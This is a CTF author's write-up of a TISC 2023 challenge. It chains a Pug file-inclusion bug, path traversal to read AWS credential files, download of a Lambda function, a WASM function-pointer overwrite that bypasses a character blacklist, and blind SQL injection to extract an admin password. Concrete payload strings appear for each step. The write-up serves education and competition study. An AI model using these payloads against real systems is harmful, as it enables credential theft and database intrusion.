TISC is a two-week online sequential style CTF competition hosted by CSIT, where participants solve a series of 10 challenges. Over 1000 participants took on the challenges, with the top three levels of challenges having a cash prize pool of $10,000 each to be shared between participants who successfully cleared the respective levels.

I was given the opportunity to create the challenge at level 8, and I'll be sharing the writeup as well as a few of my thoughts at the end of the blog post.

Congrats to the 18 people that managed to solve my challenge and get a slice of the $10,000 prize! I'm not jealous, I swear :sob:

[Link to source code (including solution scripts, c code before compiling, and how to set up the lambda function)](https://github.com/Iscaraca/CTF-Challenges/tree/main/tisc2023/blind_sql_injection)
Attached files: Dockerfile server.js db-init.sql

The website we're brought to is a really shitty reminder site where you log in with an account, type in what you want to be reminded of, and then get that string shown to you in a few different colour themes.

## Writeup
```sql
CREATE TABLE IF NOT EXISTS Users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255) NOT NULL UNIQUE,
  password VARCHAR(255) NOT NULL
);
INSERT INTO Users (username, password) VALUES ('admin', 'flag{example}');
INSERT INTO Users (username, password) VALUES ('bobby', 'password');
```
The flag is the password of the admin user. After testing the login form, we can surmise that the username and password fields of the login page only allow alphabetical inputs only. Any numerical characters or symbols are blacklisted by a lambda function.

In server.js, these comments in the `/api/login` route are probably the culprit:
```js
    // pk> Note: added URL decoding so people can use a wider range of characters for their username :)
    // dr> Are you crazy? This is dangerous. I've added a blacklist to the lambda function to prevent any possible attacks.
```

The login form passes the username and password through an AWS lambda function to check for non-alphabet characters, and return an SQL query if none are present.
```js
lambda.invoke({
    FunctionName: 'craft_query',
    Payload: payload
}, (err, data) => {
    if (err) {
        req.flash('error', 'Uh oh. Something went wrong.');
        req.session.save(() => {
            res.redirect('/');
        });
    } else {
        const responsePayload = JSON.parse(data.Payload);
        const result = responsePayload;
        if (result !== "Blacklisted!") {
            const sql = result;
            db.query(sql, (err, results) => {
                if (err) {
                    req.flash('error', 'Uh oh. Something went wrong.');
                    req.session.save(() => {
                        res.redirect('/');
                    });
                } else if (results.length !== 0) {
                    res.redirect(`/reminder?username=${username}`);
                } else {
                    req.flash('error', 'Invalid username/password');
                    req.session.save(() => {
                        res.redirect('/');
                    });
                }
            });
        } else {
            req.flash('error', 'Blacklisted');
            req.session.save(() => {
                res.redirect('/');
            });
        }
    }
});
```

Blind SQL injection is pretty much impossible without these blacklisted characters, so it suffices that another attack vector is present on the site.

### Part 1: LFI to leak AWS credentials
After logging in with bobby's credentials, the user is brought to a page with a form to create a reminder. The form includes a text input for a reminder, the name of the user, and the view type of the reminder. The viewType parameter is unsanitized and can be used to load any file.
```javascript
app.post('/api/submit-reminder', (req, res) => {
    const username = req.body.username;
    const reminder = req.body.reminder;
    const viewType = req.body.viewType;
    res.send(pug.renderFile(viewType, { username, reminder }));
});
```

Looking at the provided Dockerfile, we can see `COPY .aws/ /root/.aws/`, which seems ripe for the taking. Simply replacing the viewType parameter with `../../../../../../../../root/.aws/credentials` and `../../../../../../../../root/.aws/config` will raise errors like these:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: ../../../../../../../../root/.aws/credentials:1:1 &nbsp;&gt; 1| [default]-------^ &nbsp; &nbsp;2| aws_access_key_id = SOME_KEY_HERE &nbsp; &nbsp;3| aws_secret_access_key = SOME_OTHER_KEY_HEREunexpected text &quot;[defa&quot; &nbsp; &nbsp;at makeError (/app/node_modules/pug-error/index.js:34:13) &nbsp; &nbsp;at Lexer.error (/app/node_modules/pug-lexer/index.js:62:15) &nbsp; &nbsp;at Lexer.fail (/app/node_modules/pug-lexer/index.js:1629:10) &nbsp; &nbsp;at Lexer.advance (/app/node_modules/pug-lexer/index.js:1694:12) &nbsp; &nbsp;at Lexer.callLexerFunction (/app/node_modules/pug-lexer/index.js:1647:23) &nbsp; &nbsp;at Lexer.getTokens (/app/node_modules/pug-lexer/index.js:1706:12) &nbsp; &nbsp;at lex (/app/node_modules/pug-lexer/index.js:12:42) &nbsp; &nbsp;at Object.lex (/app/node_modules/pug/lib/index.js:104:9) &nbsp; &nbsp;at Function.loadString [as string] (/app/node_modules/pug-load/index.js:53:24) &nbsp; &nbsp;at compileBody (/app/node_modules/pug/lib/index.js:82:18)</pre>
</body>
</html>
```

From this we can read off the AWS access keys and region, and use the AWS CLI to view the blacklist lambda function.

### Part 2: Enumerating and downloading lambda function
After filling in the required information after running `aws config`, we can use these commands to list and download the lambda function:
```powershell
PS C:\Users\user> aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "craft_query",
            "FunctionArn": "arn:aws:lambda:ap-southeast-1:531845528441:function:craft_query",
            "Runtime": "nodejs18.x",
            "Role": "arn:aws:iam::531845528441:role/query",
            "Handler": "index.handler",
            "CodeSize": 26889,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-06-06T16:15:30.000+0000",
            "CodeSha256": "QIiGvIQxqppAv1c2Z5oiiT3WXtpM1ODbyip1891ZkXQ=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "f032fc4f-a894-4942-8995-80f7671bb771",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
PS C:\Users\user> wget -O craft_query.zip "$(aws lambda get-function --function-name craft_query --query 'Code.Location' --output text)"
```

Extracting the zip file, we're given 3 files: index.js, site.js, and site.wasm.

### Part 3: Function pointer overwrite in the WASM file to bypass blacklist
From the lambda handler, we see that only one function is exported from the wasm file, `craft_query`. Also, the wasm is compiled using emscripten:
```javascript
const CraftQuery = EmscriptenModule.cwrap('craft_query', 'string', ['string', 'string']);
...
const username = event.username;
const password = event.password;
const result = CraftQuery(username, password);
return result;
```

The function takes a username and password and returns a string. To analyze the wasm binary, create a test website that loads and executes `craft_query` from the wasm file for debugging with browser devtools. The JavaScript glue is designed for the node environment, so compile a test C file to wasm for the browser using Emscripten, and adapt the JavaScript glue to enable execution in a web environment.

The test website is located at `./test` in the github. Run `python3 -m http.server 80` in the directory to access the website.

We can see that `craft_query` returns an SQL statement `SELECT * from Users WHERE username="example" AND password="example"`. On sending an input with characters other than alphabets, the function returns `Blacklisted!`. To obtain the password of the admin user, it is obvious that some form of error-based blind SQL injection is necessary, but doing so is difficult with the blacklist in place. We must take advantage of another vulnerability to carry out SQL injection.

Curiously, when sending a long input for the username, the function errors out with `Uncaught RuntimeError: memory access out of bounds`. When fuzzing the length of the username parameter, at a length of 69 characters, the error changes to `Uncaught RuntimeError: table index is out of bounds`. At a length of 68 characters, the error changes again to `Uncaught RuntimeError: null function or function signature mismatch`. Upon inspection of the wasm file in the browser's developer tools, we can see that the error occurs at the end of `craft_query` at this line:
```
call_indirect (param i32 i32) (result i32)
```

When setting a breakpoint at this line and sending legitimate parameters, stepping into this indirect call will land the program in the `is_blacklisted` function. By sending different inputs, looking at the memory via the memory inspector panel, and stepping through the code in the debugger, a few things become apparent:

1. The flow of the program is as follows: `craft_query` calls `func4` with two parameters, the second one being a pointer to the username. The username is then loaded into the address at the first parameter, and `func4` returns. It then calls `func15` on an address, the address to the password string, and the integer 59. Then, it calls `is_blacklisted` on the username and password, and `func7` is called on both the username and password separately. If `func7` returns true for both calls, `is_blacklisted` calls `load_query` with the username and password and returns its result.
2. `func4` is a loop that iterates through the string and looks for the `%` sign (37 in decimal). It then converts the next two characters into a new one. This function is a url decoder.
3. `func15` is `strncpy`.
4. `func7` iterates through the string to find any non-alphabetical characters, and returns false if detected.
5. The call to `is_blacklisted` is indirect and the function pointer is stored in memory.

The runtime errors seen previously were the result of the function pointer being overwritten by the username. By overwriting the pointer with the `load_query` function, we can bypass the blacklist function entirely. Doing
```
username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%02
```
will overwrite the function pointer with the index of the `load_query` function in the function table 0x02 after being url decoded. Since `load_query` also takes in two string arguments, this overwrite doesn't error out.

### Part 4: Integrating the overwrite with SQLi
Integrating this with a standard SQLi payload, we can craft a new payload to allow for exploitation on the server. There are a few things to take note of:

1. Query cannot extend past 69 characters.
2. When enumerating past the 9th character, the length of padding at the end of the query must be adjusted to account for the change in number length.
3. The `BINARY` keyword must be used for case-sensitive comparison.

An example payload that works is:
```sql
admin" AND (SELECT BINARY SUBSTR(password,1,1) LIMIT 1)="P" --      %02
```

The full exploit script is in expl.py on the github.

## Thoughts
This was my first time creating a real CTF challenge. It took me quite a few days to ideate and implement, and while the result wasn't as polished as I'd like it to be, I think I got my original vision across.

I was truly expecting to get absolutely hounded on during the meet-and-greet with the winners. To the participants that came over and expressed appreciation for my challenge, I cannot thank you enough. It really did make the time and effort I spent completely worth it.

I made this challenge because I can't do pwn (I'm mostly a web solver, but even at that I'm pretty shit), and I feel like most people who do web don't really dip their toes into binary exploitation, so I thought it would be funny if I just made a pretend web challenge to get them excited only to psych them out with WASM halfway through (which was why the WASM file was stored on the lambda, so they couldn't tell only until after the files are downloaded from AWS). The challenge tags kinda ruined it though.

Man, I regret not making the WASM pwn part more difficult. The original idea was to do proper RE on the wasm binary and have participants craft a clear path of attack before doing anything, but many people I've talked to managed to fuzz the vulnerability out and go from intuition alone. It's still a hard challenge nonetheless, but I feel like the meat of the potential was lost there.

Some other ideas I had for the challenge were to perhaps make it so that the location to overwrite the function pointer overlapped with the minimum number of characters required to perform SQLi, so participants would have to somehow work around the added three characters in some sort of way:
`admin" AND "%02"="%02" AND (SELECT BINARY SUBSTR(password,1,1) LIMIT 1)="P" -- `
Where the second `%02` would overwrite the function pointer. Wouldn't have increased the difficulty by a lot, but it would've definitely made it more interesting.

The challenge also kept crashing for some people. Initially I thought it was the fact that WASM couldn't collapse its memory, so the memory was just inflating on the cloud until the function crashed, but now that I look back at it, probably not. Coupled with the fact that it only crashed for some people. I didn't deal with challenge infra during the competition so I have no logs or statistics to go by, but I'll try to figure it out and will update this blog post once I have a semi-concrete reason.

I am really, really sorry to Kenneth from ATL and Charin and Wei Jie from CSIT. I was honestly just an infra disaster.

## Making the challenge
The entirety of the challenge minus AWS credentials are on my github.
